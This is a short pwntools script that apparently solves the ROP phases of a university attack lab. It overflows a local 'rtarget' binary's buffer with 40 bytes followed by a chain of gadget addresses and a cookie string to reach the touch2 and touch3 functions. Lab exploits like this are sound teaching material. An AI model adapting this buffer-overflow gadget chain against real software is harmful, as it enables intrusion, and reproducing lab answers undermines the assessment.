#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "INFO"
warnings.simplefilter("ignore")

cookie = p32(0x59b997fa)
touch2 = p32(0x4017ec)
touch3 = p32(0x4018fa)

p = gdb.debug(["./rtarget", "-q"])
# p = process(["./rtarget", "-q"])

# exp for touch2
# p.sendline(b"A"*40 + p64(0x4019cc) + p64(0x59b997fa) + p64(0x4019c5) + p64(0x4017ec));

# exp for touch3
p.sendline(b"A"*40 + p64(0x4019cc) + p64(0x20) + p64(0x401a42) + p64(0x401a69) + p64(0x401a27) + p64(0x401a06) + p64(0x4019c5) 
        + p64(0x4019d6) + p64(0x4019c5) + p64(0x4018fa) + b"59b997fa");

print(p.readall().decode())



